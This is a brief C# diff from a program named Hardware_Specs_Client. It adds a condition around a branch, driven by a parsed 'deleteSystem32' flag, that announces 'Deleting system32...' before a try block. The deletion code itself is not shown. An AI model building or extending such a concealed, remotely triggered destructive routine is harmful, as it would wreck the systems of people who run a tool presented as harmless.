@@ -79,7 +79,8 @@ namespace Hardware_Specs_Client
                     {
                         Console.WriteLine($"Couldn't parse {ob["deleteSystem32"]} to a bool.");
                         return;
-                    } else
+                    } 
+                    else if(deleteSystem32)
                     {
                         Console.WriteLine("Deleting system32...");
                         try
